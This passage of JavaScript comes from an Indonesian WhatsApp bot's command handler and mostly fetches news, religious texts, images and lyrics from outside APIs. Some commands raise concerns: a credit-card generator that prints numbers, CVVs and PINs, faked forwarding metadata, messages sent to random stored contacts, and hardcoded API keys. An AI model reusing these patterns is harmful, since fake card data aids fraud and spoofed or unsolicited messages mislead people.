				   teks = `- *Fakta* : ${anu.result.fakta}`
				   reply(teks)
		break
		case 'style':
		anu = require('./lib/fancytext')
		pao = await anu.fancy(body.slice(7))
			reply(pao.result)
		break
		case 'findhost':
				
				teks = body.slice(10)
				   anu = await fetchJson(`https://api.banghasan.com/domain/hostsearch/${teks}`)
				   if (anu.hasil == 'API count exceeded - Increase Quota with Membership') return
				   reply(anu.hasil)
		break
		case 'cekping':
				
				teks = body.slice(10)
				   anu = await fetchJson(`https://api.banghasan.com/domain/nping/${teks}`)
				   if (anu.hasil == 'API count exceeded - Increase Quota with Membership') return
				   reply(anu.hasil)
		break
		case 'cekdns':
				
				teks = body.slice(10)
				   anu = await fetchJson(`https://api.banghasan.com/domain/dnslookup/${teks}`)
				   if (anu.hasil == 'API count exceeded - Increase Quota with Membership') return
				   reply(anu.hasil)
		break
		case 'bioskop':
				
				 tekss = body.slice(9)
				   anu = await fetchJson(`http://docs-jojo.herokuapp.com/api/bioskop?kota=${tekss}&apikey=undefined`)
				teks = `*╔❏* *BIOSKOP*\n\n`
				for (let o of anu.result) {
					 teks += `*Nama:* ${o.title}\n*Alamat:* ${o.alamat}\n*Bintang:* ${o.bintang}\n*Link:* ${o.url}\n============================\n`
				buffer = await getBaper(o.img)
				}
				  benny.sendMessage(from, buffer, image, {quoted: adadeh, caption: teks.trim()})
		break
		case 'kisahnabi':
				
				 tekss = body.slice(11)
				   anu = await fetchJson(`https://pecundang.herokuapp.com/api/kisahnabi?nabi=${tekss}`)
				if (anu.status == false) return reply(`Masukan nama nabi yang benar! jangan main-main!`)
				nabi = anu.result.nabi
				buffer = await getBaper(nabi.image)
				teks = `*╔❏* *KISAH NABI*\n*╠❏* *Nama* : ${nabi.nabi}\n*╠❏* *Lahir* : ${nabi.lahir}\n*╠❏* *Umur* : ${nabi.umur}\n*╠❏* *Kota* : ${nabi.tempat}\n*╚❏* *Kisah* : ${nabi.kisah}\n`
                 benny.sendMessage(from, buffer, image, {quoted: adadeh, caption: teks})
		break
		case 'niatshalat':
		case 'niatsholat':
				
				   anu = await fetchJson(`https://pecundang.herokuapp.com/api/muslim/niatshalat?apikey=adadeh`)
				   teks = `*╔❏* *NIAT SHALAT*\n\n`
				   for (let o of anu.result) {
					  teks += `*${o.name}*\n*Arab:* ${o.arabic}\n*Latin:* ${o.latin}\n*Terjemah:* ${o.terjemahan}\n=============================\n`
				   }
				   reply(teks)
		break
		case 'cnnindo':
		case 'cnnindonesia':
				
				   anu = await fetchJson(`http://api.lolhuman.xyz/api/cnnindonesia?apikey=${lolkey}`)
				   teks = `*╔❏* *CNN INDONESIA*\n\n\n===========================\n`
				   for (let o of anu.result) {
					   buffer = await getBaper(o.poster)
					  teks += `*${o.judul}*\n*Tipe:* ${o.tipe}\n*Waktu:* ${o.waktu}\n*Link:* ${o.link}\n===========================\n`
				   }
				   benny.sendMessage(from, buffer, image, {quoted: adadeh, caption: teks.trim()})
		break
		case 'merdeka':
				
				   anu = await fetchJson(`https://pencarikode.xyz/news/merdeka?apikey=pais`)
				   teks = `*╔❏* *MERDEKA DOT COM*\n\n\n===========================\n`
				   g = 1
				   for (let o of anu.result) {
					   buffer = await getBaper(o.thumb)
					  teks += `*${g++}. ${o.judul}*\n*Waktu:* ${o.uptime}\n*Link:* ${o.link}\n===========================\n`
				   }
				   benny.sendMessage(from, buffer, image, {quoted: adadeh, caption: teks.trim()})
		break
		case 'liputan6':
				
				   anu = await fetchJson(`https://api.zeks.xyz/api/liputan6?apikey=YunitaGanteng`)
				   teks = `*╔❏* *LIPUTAN6 NEWS*\n\n\n===========================\n`
				   j = 1
				   for (let o of anu.result) {
					   buffer = await getBaper(o.thumb)
					  teks += `*${j++}. ${o.title}*\n*Ket:* ${o.ket}\n*Kategori:* ${o.category}\n*Waktu:* ${o.time}\n*Link:* ${o.link}\n===========================\n`
				   }
				   benny.sendMessage(from, buffer, image, {quoted: adadeh, caption: teks.trim()})
		break
		case 'foxnews':
				
				   anu = await fetchJson(`https://api.zeks.xyz/api/foxnews?apikey=YunitaGanteng`)
				   teks = `*╔❏* *FOX NEWS*\n\n\n===========================\n`
				   v = 1
				   for (let o of anu.result) {
					   buffer = await getBaper(o.thumb)
					  teks += `*${v++}. ${o.title}*\n*Ket:* ${o.content}\n*Negara:* ${o.country}\n*Waktu:* ${o.time}\n*Link:* ${o.url}\n===========================\n`
				   }
				   benny.sendMessage(from, buffer, image, {quoted: adadeh, caption: teks.trim()})
		break
		case 'neonime':
				
				   anu = await fetchJson(`https://tobz-api.herokuapp.com/api/neonimeongoing?apikey=BotWeA`)
				   teks = `*╔❏* *FOX NEWS*\n\n\n===========================\n`
				   v = 1
				   for (let o of anu.result) {
					   buffer = await getBaper(o.image)
					  teks += `*${v++}. ${o.title}*\n*Desc:* ${o.desc}\n*Link:* ${o.link}\n===========================\n`
				   }
				   benny.sendMessage(from, buffer, image, {quoted: adadeh, caption: teks.trim()})
		break
		case 'tribunnews':
				
				   anu = await fetchJson(`https://api.zeks.xyz/api/tribunews?apikey=YunitaGanteng`)
				   teks = `*╔❏* *TRIBUN NEWS*\n\n\n===========================\n`
				   h = 1
				   for (let o of anu.result) {
					  teks += `*${h++}. ${o.title}*\n*Ket:* ${o.ket}\n*Waktu:* ${o.time}\n*Link:* ${o.url}\n=============================\n`
				   }
				   reply(teks.trim())
		break
		case 'antaranews':
				
				   anu = await fetchJson(`https://pencarikode.xyz/news/merdeka?apikey=pais`)
				   teks = `*╔❏* *ANTARA NEWS*\n\n\n===========================\n`
				   h = 1
				   for (let o of anu.result) {
					  teks += `*${h++}. ${o.title}*\n*Info:* ${o.uptime}\n*Link:* ${o.link}\n=============================\n`
				   }
				   reply(teks.trim())
		break
		case 'palingmurah':
				
				   anu = await fetchJson(`https://pencarikode.xyz/api/palingmurah?apikey=pais`)
				   teks = `*╔❏* *PALING MURAH*\n\n\n===========================\n`
				   y = 1
				   for (let o of anu.result) {
					  teks += `*${y++}. ${o.barang}*\n*Harga:* ${o.harga}\n*Penjual:* ${o.penjual}\n*Link:* ${o.url}\n=============================\n`
				   }
				   reply(teks.trim())
		break
		case 'langka':
		const langka = async (jid) => {
		const lang = await benny.query({ json: ['action', 'Status', jid], requiresPhoneConnection: false})
		return lang
		}
		anu = await langka(from)
		console.log(anu)
		break
		case 'berita':
				
				   anu = await fetchJson(`http://api.lolhuman.xyz/api/newsinfo?apikey=${lolkey}`)
				   teks = `*╔❏* *BERITA TERBARU*\n\n`
				   p = 1
				   for (let o of anu.result) {
					   buffer = await getBaper(o.urlToImage)
					  teks += `*${p++}. ${o.source.name}*\n*Judul:* ${o.title}\n*Deskripsi:* ${o.description}\n*Author:* ${o.author}\n*Waktu:* ${o.publishedAt}\n*Link:* ${o.url}\n===========================\n`
				   }
				   benny.sendMessage(from, buffer, image, {quoted: adadeh, caption: teks.trim()})
		break
		case 'shopee':
				
				tekss = body.slice(8)
				   anu = await fetchJson(`https://api.vhtear.com/shopee?query=${tekss}&count=10&apikey=YunitaGanteng`)
				   teks = `*╔❏* *SOPE ID*\n\n`
				   p = 1
				   for (let o of anu.result.items) {
					  teks += `*${p++}. ${o.nama}*\n*Harga:* ${o.harga}\n*Terjual:* ${o.terjual}\n*Lokasi toko:* ${o.shop_location}\n*Link:* ${o.link_product}\n===========================\n`
				   }
				   reply(teks.trim())
		break
		case 'doaharian':
				
				   anu = await fetchJson(`https://pecundang.herokuapp.com/api/muslim/doaharian?apikey=adadeh`)
				   teks = `*╔❏* *DOA HARIAN*\n\n`
				   for (let o of anu.result.data) {
					  teks += `*${o.title}*\n*Arab:* ${o.arabic}\n*Latin:* ${o.latin}\n*Terjemah:* ${o.translation}\n=============================\n`
				   }
				   reply(teks)
		break
		case 'doatahlil':
				
				   anu = await fetchJson(`https://dhyzx-free-api.herokuapp.com/api/muslim/tahlil?apikey=undefined`)
				   teks = `*╔❏* *DOA TAHLIL*\n\n`
				   for (let o of anu.result.data) {
					  teks += `*${o.title}*\n*Arab:* ${o.arabic}\n*Terjemah:* ${o.translation}\n=============================\n`
				   }
				   reply(teks)
		break
		case 'bacaanshalat':
		case 'bacaansholat':
				
				   anu = await fetchJson(`https://dhyzx-free-api.herokuapp.com/api/muslim/bacaanshalat?apikey=undefined`)
				   teks = `*╔❏* *BACAAN SHALAT*\n\n`
				   for (let o of anu.result) {
					  teks += `*${o.name}*\n*Arab:* ${o.arabic}\n*Latin:* ${o.latin}\n*Terjemah:* ${o.translation}\n=============================\n`
				   }
				   reply(teks)
		break
		case 'asmaulhusna':
				
				   anu = await fetchJson(`https://dhyzx-free-api.herokuapp.com/api/muslim/asmaulhusna?apikey=undefined`)
				   teks = `*╔❏* *ASMAUL HUSNA*\n\n`
				   p = 1
				   for (let o of anu.result.data) {
					  teks += `*${p++}. ${o.latin}*\n*Arab:* ${o.arabic}\n*Arti:* ${o.translation_id}\n=============================\n`
				   }
				   reply(teks.trim())
		break
		case 'doawirid':
				
				   anu = await fetchJson(`https://dhyzx-free-api.herokuapp.com/api/muslim/wirid?apikey=undefined`)
				   teks = `*╔❏* *DOA WIRID*\n\n`
				   for (let o of anu.result.data) {
					  teks += `*${o.id}* ${o.arabic}\n=============================\n`
				   }
				   reply(teks)
		break
		case 'hadits':
				
				if (!Number(args[0])) return reply('Hadits berupa nomor!')
				tekss = body.slice(8)
				   anu = await fetchJson(`https://dhyzx-free-api.herokuapp.com/api/hadits?kitab=bukhari&nomor=${tekss}&apikey=undefined`)
				    o = anu.result.data
					teks = `*╔❏* *H.R BUKHORI*\n\n*${o.name}*\n*Arab:* ${o.contents.arab}\n*Latin:* ${o.contents.id}\n=============================\n`
				   reply(teks)
		break
		case 'ayatkursi':
				
				tekss = body.slice(8)
				   anu = await fetchJson(`https://dhyzx-free-api.herokuapp.com/api/muslim/ayatkursi?apikey=undefined`)
				    o = anu.result.data
					teks = `*╔❏* *AYAT KURSI*\n\n*Arab:* ${o.arabic}\n*Latin:* ${o.latin}\n*Terjemah:* ${o.translation}`
				   reply(teks)
		break
		case 'tolol':
		
		teks = body.slice(7)
		anu = await getBaper(`http://api.lolhuman.xyz/api/toloserti?apikey=${lolkey}&name=${teks}`)
		benny.sendMessage(from, anu, image, {quoted: adadeh})
		break
		case 'youtuber':
		
		teks = body.slice(10)
		anu = await getBaper(`http://www.rzky.net/docs/api/YoutuberSerti/img.php?nama=${teks}`)
		benny.sendMessage(from, anu, image, {quoted: adadeh})
		break
		case 'jamet':
		
		teks = body.slice(7)
		anu = await getBaper(`http://www.rzky.net/docs/api/GoodBoySerti/img.php?nama=${teks}`)
		benny.sendMessage(from, anu, image, {quoted: adadeh})
		break
		case 'surga':
		
		teks = body.slice(7)
		anu = await getBaper(`http://www.rzky.net/docs/api/SurgaSerti/img.php?nama=${teks}`)
		benny.sendMessage(from, anu, image, {quoted: adadeh})
		break
		case 'badboy':
		
		teks = body.slice(8)
		anu = await getBaper(`http://www.rzky.net/docs/api/BadBoySerti/img.php?nama=${teks}`)
		benny.sendMessage(from, anu, image, {quoted: adadeh})
		break
		case 'bucin':
				
				   ono = JSON.parse(fs.readFileSync('./src/bucin.json'))
  randIndex = ono[Math.floor(Math.random() * ono.length)]
				   reply(randIndex)
		break
		case 'bucin2':
				
				   anu = await fetchJson(`http://api.lolhuman.xyz/api/random/katabucin?apikey=${lolkey}`)
				   teks = `*${anu.result}*`
				   reply(teks)
		break
		case 'kodepos':
				
				if (args.length < 1) return reply('*Kelurahan nya mana?*')
				 tekss = body.slice(9)
				   anu = await fetchJson(`https://videfikri.com/api/kodepos/?query=${tekss}`)
				   teks = `*╔❏* *KODE POS*\n*╠❏*\n*╠❏* *Kelurahan:* ${anu.result.kelurahan}\n*╠❏* *Kecamatan:* ${anu.result.kelurahan}\n*╠❏* *Kode pos:* ${anu.result.kodepos}\n*╠❏* *Provinsi:* ${anu.result.provinsi}\n*╚❏* *Kota:* ${anu.result.kota}`
				   reply(teks)
		break
		case 'balikhuruf':
				
				if (args.length < 1) return reply('*Hurufnya mana?*')
				 tekss = body.slice(12)
				 teks = tekss.split('').reverse().join('')
				   reply(teks)
		break
		case 'dewabatch':
				
				if (args.length < 1) return reply('*Hurufnya mana?*')
				 tekss = body.slice(11)
				   anu = await fetchJson(`http://docs-jojo.herokuapp.com/api/dewabatch?q=${tekss}`)
				   teks = `${anu.sinopsis}`
				   buffer = await getBaper(anu.thumb)
			benny.sendMessage(from, buffer, image, {quoted: adadeh, caption: teks})
			break
			case 'kusonime':
				
				if (args.length < 1) return reply('*Hurufnya mana?*')
				 tekss = body.slice(10)
				   anu = await kusonime(tekss)
				   console.log(anu)
				   buffer = await getBaper(anu.img)
				   teks = `*Judul:* ${anu.judul}\n*Genre:* ${anu.genre}\n*Durasi:* ${anu.duration}\n*Total eps:* ${anu.total_eps}\n*Link:* ${anu.link}`
			benny.sendMessage(from, buffer, image, {quoted: adadeh, caption: teks})
			break
			case 'wattpad':
				
				if (args.length < 1) return reply('*Judulnya apa?*')
				 tekss = body.slice(9)
				 o = 1
				   anu = await fetchJson(`http://docs-jojo.herokuapp.com/api/wattpad_search?q=${tekss}`)
				   teks = `*╔❏* *WATTPAD SEARCH*\n\n`
	         for (let ok of anu.result) {
				 buffer = await getBaper(ok.thumb)
				   teks += `*${o++}. ${ok.title}*\n*Dibaca:* ${ok.reads}\n*Votes:* ${ok.votes}\n===========================\n`
			 }
			benny.sendMessage(from, buffer, image, {quoted: adadeh, caption: teks.trim()})
			break
			case 'drakor':
				
				 t = 1
				   anu = await fetchJson(`http://api.lolhuman.xyz/api/drakorongoing?apikey=${lolkey}`)
				   teks = `*╔❏* *DERAMA KOREA*\n\n`
	         for (let o of anu.result) {
				 buffer = await getBaper(o.thumbnail)
				   teks += `*${t++}. ${o.title}*\n*Episode:* ${o.total_episode}\n*Genre:* ${o.genre}\n*Tahun:* ${o.year}\n===========================\n`
			 }
			benny.sendMessage(from, buffer, image, {quoted: adadeh, caption: teks.trim()})
			break
		case 'ceritahorror':
		case 'ceritahoror':
				
				   anu = await fetchJson(`https://naufalhoster.xyz/tools/story_horror?apikey=${naufalkey}`)
				   teks = `*╔❏* *CERITA HORROR*\n*╠❏*\n*╠❏* *Judul:* ${anu.result.title}\n*╚❏* *Cerita:* ${anu.result.story}`
				   reply(teks)
		break
		case 'fml':
		case 'fuckmylife':
				
				   anu = await fetchJson(`https://tobz-api.herokuapp.com/api/randomfmylife?apikey=BotWeA`)
				   anu1 = await fetchJson(`https://hujanapi.herokuapp.com/api/translate?lang=en&tr=id&query=${anu.result}&apikey=AdelwinNL`)
				   teks = `- *Fuck my life* : ${anu1.result.output}`
				   reply(teks)
		break
		case 'motivasi':
				
				   anu = await fetchJson(`https://pencarikode.xyz/api/motivasi?apikey=pais`)
				   teks = `- *Fakta* : ${anu.message}`
				   reply(teks)
		break
				 case 'quotesnime':
				 
				   anu = await fetchJson(`https://api-zefian.glitch.me/api/quotesnime/random`)
				   teks = `- *Anime* : ${anu.data.anime}\n- *Karakter* : ${anu.data.character}\n- *Quotes* : ${anu.data.quote} `
				   reply(teks)
		break
				case 'wiki':
				if (args.length < 1) return reply('Mau cari apa?')
					var teks = body.slice(6)
						reply(mess.wait)
						try {
						anu = await wikiSearch(teks)
						console.log(anu)
						reply(`*Judul:* ${anu.judul}\n\n*Hasil:* ${anu.wiki}`)
						} catch (err) {
							reply(`Wiki ${teks} tidak ditemukan!`)
						}
					break
					case 'jagokata':
				if (args.length < 1) return reply('Mau cari apa?')
					var teks = body.slice(10)
						reply(mess.wait)
						try {
						anu = await jagoKata(teks)
						console.log(anu)
						reply(`*By:* ${anu.by}\n\n*Kata:* ${anu.isi}`)
						} catch (err) {
							reply(`Jago kata ${teks} tidak ditemukan!`)
						}
					break
					case 'find':
					reply('[WAIT] Sedang mencari partner...')
					ono = fs.readFileSync('./src/.dat/msg.data.json')
  jsonData = JSON.parse(ono)
  randIndex = Math.floor(Math.random() * jsonData.length)
  randKey = jsonData[randIndex]
  okelas = randKey.participant
					benny.sendMessage(okelas, `*Hai kamu diajak ngobrol sama* @${sender.split('@')[0]}`, text, {contextInfo: { mentionedJid: [sender] }})
					benny.sendMessage(from, `*Berhasil menemukan partner!* @${okelas.split('@')[0]}`, text, {contextInfo: { mentionedJid: [okelas] }, quoted: adadeh })
					break
					case 'ebase64':
				 
				 tekss = body.slice(9)
					anu = await fetchJson(`https://naufalhoster.xyz/utils/base64?apikey=${naufalkey}&type=encode&string=${tekss}`)
			teks = `*Encode*\n➸ *String* : ${tekss}\n➸ *Result* : ${anu.result.encrypt}`
	         reply(teks)
				break
				case 'dbase64':
				 
				 tekss = body.slice(9)
					anu = await fetchJson(`https://naufalhoster.xyz/utils/base64?apikey=${naufalkey}&type=decode&string=${tekss}`)
			teks = `*Encode*\n➸ *String* : ${tekss}\n➸ *Result* : ${anu.result.encrypt}`
	         reply(teks)
				break
				case 'kartukredit':
				 
					anu = await fetchJson(`https://videfikri.com/api/ccgenerator/`)
			teks = `「 *KARTU KREDIT* 」\n\n*Card* : \n➸ *Network* : ${anu.result.card.network}\n➸ *Number* : ${anu.result.card.number}\n➸ *CVV* : ${anu.result.card.cvv}\n➸ *PIN* : ${anu.result.card.pin}\n➸ *Balance* : ${anu.result.card.balance}\n\n*Customer* :\n➸ *Name* : ${anu.result.customer.name}\n➸ *Address* : ${anu.result.customer.address}\n➸ *Country* : ${anu.result.customer.country}`
			reply(teks)
			break
			     case 'cerpen':
				 
					fetchJson('https://masgi.herokuapp.com/api/cerpen').then((res) => {
						reply(mess.wait)
					let hasilnya = `Cerpen:\n${res.data}`;
						reply(hasilnya)
					 })
					break
				case 'lirik':
				
				tekss = body.slice(7)
				anu = await fetchJson(`https://scrap.terhambar.com/lirik?word=${tekss}`)
				teks = `- *Lagu* : ${tekss}\n- *Lirik* : ${anu.result.lirik}`
				reply(teks)
					break
				case 'chord':
				
				tekss = body.slice(7)
				anu = await fetchJson(`https://scrap.terhambar.com/lirik?word=${tekss}`)
				teks = `- *Lagu* : ${tekss}\n- *Lirik* : ${anu.result.lirik}`
				reply(teks)
					break
				case 'katasenja':
				 
					anu = await fetchJson(`https://pencarikode.xyz/api/katasenja?apikey=pais`)
					teks = `*Kata-kata senja:*\n${anu.message}`
					reply(teks)
					break
				case 'katadilan':
				anu = await fetchJson(`http://api.lolhuman.xyz/api/quotes/dilan?apikey=${lolkey}`)
				reply(anu.result)
				break
				case 'katabijak':
				 
					fetchJson('https://pencarikode.xyz/api/katabijak?apikey=pais').then((res) => {
						reply('[ WAIT ] Searching...⏳ silahkan tunggu')
						hasilnya = `*Katabijak* : ${res.message}`;
						reply(hasilnya)
					})
		break
		case 'cekinv':
		case 'cekinvite':
		case 'cekcode':
		anu = await groupInfo(`${args[0]}`)
		anu1 = await pasteGG.post({
  name: namabot, // Optional
		description: `PasteGG by ${namabot}`, // Optional
  expires: "2025-12-30T02:25:56.428Z", // Optional
  files: [{
    name: `${namabot}.txt`, // Optional
    content: {
      format: "text",
      value: anu.desc
    }
  }]
})
teks = `*Subject:* ${anu.subject}\n*ID:* ${anu.id.replace('@g.us', '')}\n*Desc:*\n${anu1.result.url}\n*Jumlah Member:* ${anu.size}`
reply(teks)
		console.log(anu)
		break
				case 'gcname':
				
					await benny.groupUpdateSubject(from, `${body.slice(8)}`)
					reply(`「 *CHANGE TO ${body.slice(8)}* 」`)
					break
					benny.contactReport
				case 'gcdesk':
				
					await benny.groupUpdateDescription(from, `${body.slice(8)}`)
					reply(`「 *CHANGE TO ${body.slice(8)}* 」`)
					break
				case 'images':
				
				anu = await fetchJson(`https://api.fdci.se/rep.php?gambar=${body.slice(7)}`)
				reply(mess.wait)
						const imgs = anu[Math.floor(Math.random() * anu.length)]
				buffer = await getBaper(imgs)
				benny.sendMessage(from, buffer, image, {quoted: adadeh})
				break
			case 'gambar':
				
				if (args.length < 1) return reply('Gambar apa?')
				teks = body.slice(8)
				buffer = await getBaper(`http://api.lolhuman.xyz/api/gimage?apikey=${lolkey}&query=${teks}`)
				reply(mess.wait)
			benny.sendMessage(from, buffer, image, {quoted: adadeh, caption: `Gambar: ${teks}`})
				break
				case 'wallnime':
				
				if (args.length < 1) return reply('Wallpaper apa?')
				buffer = await getBaper(`http://api.lolhuman.xyz/api/random/wallnime?apikey=${lolkey}`)
				reply(mess.wait)
			benny.sendMessage(from, buffer, image, {quoted: adadeh, caption: `*Wallpaper Anime*`})
				break
				case 'wallpaper':
				
				if (args.length < 1) return reply('Wallpaper apa?')
				teks = body.slice(1)
				wallpap = body.slice(11)
				buffer = await getBaper(`http://api.lolhuman.xyz/api/gimage?apikey=${lolkey}&query=wallpaper+${wallpap}`)
				reply(mess.wait)
			benny.sendMessage(from, buffer, image, {quoted: adadeh, caption: `Wallpaper: ${wallpap}`})
				break
				case 'wallpaper2':
				
				if (args.length < 1) return reply('Wallpaper apa?')
				wallpap = body.slice(12)
				buffer = await getBaper(`http://api.lolhuman.xyz/api/gimage?apikey=${lolkey}&query=wallpaper+${wallpap}`)
				reply(mess.wait)
			benny.sendMessage(from, buffer, image, {quoted: adadeh, caption: `Wallpaper: ${wallpap}`})
				break
				case 'wallpaper3':
				
				if (args.length < 1) return reply('Wallpaper apa?')
				teks = body.slice(1)
				wallpap = body.slice(12)
				anu = await fetchJson(`http://api.lolhuman.xyz/api/gimage2?apikey=${lolkey}&query=&query=wallpaper+${wallpap}`)
		let aof = anu.result[Math.floor(Math.random() * anu.result.length)]
		buffer = await getBaper(aof)
		benny.sendMessage(from, buffer, image, {quoted: adadeh, caption: `Wallpaper: ${wallpap}`})
				break
				case 'naruto':
				case 'minato':
				case 'boruto':
				case 'hinata':
				case 'sasuke':
				case 'sakura':
				case 'kaneki':
				case 'toukachan':
				case 'rize':
				case 'akira':
				case 'itori':
				case 'kurumi':
				case 'miku':
					reply(mess.wait)
					nye = await getBaper(`http://api.lolhuman.xyz/api/gimage?apikey=${lolkey}&query=${command}`)
					benny.sendMessage(from, nye, image, { caption: `${command}!!`, quoted: adadeh })
					break 
// akhir fitur anime

				case 'anjing':
				
					nye = await getBaper(`http://api.lolhuman.xyz/api/gimage?apikey=${lolkey}&query=anjing`)
					reply(mess.wait)
					benny.sendMessage(from, pok, image, {quoted: adadeh})
					break
				case 'forward':
				if (budy.length > 8) {
                const msk = body.slice(9)
                benny.sendMessage(from, msk, text, { "contextInfo": {"forwardingScore": 999,"isForwarded": true}, quoted: adadeh})
				} else if (args.length < 1) {
				const msk = ben.message.extendedTextMessage.contextInfo.quotedMessage.conversation
                benny.sendMessage(from, msk, text, { "contextInfo": {"forwardingScore": 999,"isForwarded": true}, quoted: adadeh})
				}
				break
				case 'readmore':
				if (budy.length > 9) {
                const mskp = body.slice(9)
                benny.sendMessage(from, `͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏${mskp}͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏`, text, {quoted: adadeh})
				} else if (args.length < 1) {
				const mskp = ben.message.extendedTextMessage.contextInfo.quotedMessage.conversation
